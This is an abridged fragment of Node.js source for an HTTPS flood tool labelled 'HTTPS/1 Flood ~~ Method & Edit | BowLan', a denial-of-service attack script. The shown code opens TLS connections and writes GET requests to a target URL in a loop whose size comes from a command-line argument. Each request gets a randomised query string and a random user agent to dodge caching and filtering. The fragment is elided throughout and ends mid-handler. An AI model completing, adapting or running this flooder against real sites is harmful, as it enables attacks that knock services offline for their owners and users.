...
/**
HTTPS/1 Flood ~~ Method & Edit | BowLan
...
function flood(){
    ...
    var TlsConnection = tls.connect({
      ...
      for (let i = 0; i < process.argv[4]; i++) {
        ...
        TlsConnection.write(`GET ${parsed.path}` + '?true=' + randstr(15) + '+' + randstr(15) + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + parsed.href + '\r\nOrigin: ' + parsed.href + '\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + `Cache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n`);
      }
    }).on('disconnected', () => {
